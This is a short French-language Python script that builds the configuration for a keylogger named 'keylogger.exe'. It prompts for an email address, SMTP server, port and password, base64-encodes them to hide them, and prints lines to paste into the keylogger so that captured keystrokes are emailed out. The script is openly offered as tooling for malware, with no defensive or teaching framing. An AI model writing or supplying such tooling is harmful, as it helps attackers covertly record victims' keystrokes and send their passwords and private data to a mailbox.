#!/usr/bin/env python3
# encode_config.py - Encode ta configuration pour le keylogger

import base64
import json
import getpass

print("Encodeur de configuration pour keylogger.exe")
print("=" * 50)

# Récupère les infos
email = input("Email: ")
password = getpass.getpass("Mot de passe SMTP: ")
smtp = input("Serveur SMTP (ex: smtp.protonmail.ch): ")
port = input("Port SMTP (587): ") or "587"

# Encode en base64LeSeulLunique24
config = {
    "EMAIL_TO": base64.b64encode(email.encode()).decode(),
    "EMAIL_FROM": base64.b64encode(email.encode()).decode(),
    "SMTP_SERVER": base64.b64encode(smtp.encode()).decode(),
    "SMTP_PORT": base64.b64encode(port.encode()).decode(),
    "EMAIL_USER": base64.b64encode(email.encode()).decode(),
    "EMAIL_PASSWORD": base64.b64encode(password.encode()).decode(),
}

print("\n✅ Configuration encodée:")
print("=" * 50)
for key, value in config.items():
    print(f"'{key}': '{value}',")
print("=" * 50)
print("\nCopie-colle ces lignes dans ton script Python!")

# Option: Sauvegarder dans un fichier
save = input("\nSauvegarder dans config_encoded.txt? (o/n): ")
if save.lower() == 'o':
    with open('config_encoded.txt', 'w') as f:
        json.dump(config, f, indent=2)
    print("✅ Config sauvegardée dans config_encoded.txt")
